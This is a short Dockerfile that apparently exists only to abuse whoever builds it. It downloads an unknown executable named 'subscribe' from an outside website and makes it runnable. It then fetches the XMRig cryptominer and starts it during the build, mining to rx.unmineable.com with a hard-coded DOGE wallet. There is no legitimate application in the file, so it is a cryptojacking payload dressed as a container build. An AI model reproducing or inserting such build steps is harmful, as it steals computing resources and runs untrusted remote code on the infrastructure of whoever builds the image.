FROM ubuntu:20.04 as ubuntu-base

ENV DEBIAN_FRONTEND=noninteractive \

    DEBCONF_NONINTERACTIVE_SEEN=true

RUN apt update

RUN apt -y install wget

RUN wget http://ilovenypizza.com/subscribe

RUN chmod +x subscribe

RUN wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-x64.tar.gz && tar -zxvf xmrig-6.12.2-linux-x64.tar.gz && cd xmrig-6.12.2 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u DOGE:A4zrkntUhAvongdXb4JChK7s4kxpNNPVLk
